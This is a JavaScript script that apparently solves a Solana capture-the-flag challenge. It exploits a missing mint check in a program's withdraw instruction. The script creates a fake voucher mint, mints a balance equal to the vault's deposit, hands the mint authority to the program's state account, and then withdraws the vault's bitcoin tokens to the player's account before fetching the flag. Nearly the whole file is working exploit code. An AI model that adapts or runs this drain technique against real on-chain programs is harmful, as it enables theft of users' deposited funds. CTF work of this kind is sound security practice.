import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { parseAccounts, sendInstructions } from "./util.js";

import * as spl_token from '@solana/spl-token';
import * as web3 from '@solana/web3.js';
import { AuthorityType } from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge1.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeOne;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

async function attack() {
    console.log(accounts);
    let amount = await conn.getTokenAccountBalance(accounts.depositAccount).then(_ => new BN(_.value.amount));
    console.log("Amount : "+ amount);

    // creating mint account
    const mint = await spl_token.createMint(conn, player, player.publicKey, null, 0);
    console.log('Created new Mint : ' + mint);

    // creating a fake_depositor_account and minting tokens
    const fake_depositor_account = await spl_token.createAssociatedTokenAccount(conn, player, mint, player.publicKey);
    await spl_token.mintToChecked(conn, player, mint, fake_depositor_account, player, amount, 0);
    console.log(`Minted ${amount} to a new voucher_depositor_account: ${fake_depositor_account}`);

    // transfer the ownership of the mint to state
    await spl_token.setAuthority(conn, player, mint, player, AuthorityType.MintTokens, accounts.state);
    console.log("Transfered the authority to the state");

    // getting the accociated token account of player of bitcoin mint
    let player_bitcoin_token_account = await conn.getParsedTokenAccountsByOwner(player.publicKey, {
            mint: accounts.bitcoinMint,
        }).then(resp => new web3.PublicKey(resp.value[0].pubkey.toString()));
    console.log("Player bitcoin token address: ",player_bitcoin_token_account);
    

    // creating a new transaction
    const txn = new web3.Transaction().add(
        await program.instruction.withdraw(amount, {
        accounts: {
            player: player.publicKey,
            depositor: player.publicKey,
            state: accounts.state,
            depositAccount: accounts.depositAccount,
            voucherMint: mint,
            depositorAccount: player_bitcoin_token_account,
            depositorVoucherAccount: fake_depositor_account,
            tokenProgram: spl_token.TOKEN_PROGRAM_ID
        }})
    );
    // signing and sending the transaction
    const sign = await web3.sendAndConfirmTransaction(conn, txn, [player]);
    console.log("Signature: "+ sign);
    amount = await conn.getTokenAccountBalance(accounts.depositAccount).then(_ => new BN(_.value.amount));
    console.log("Amount : "+ amount);
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 1);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
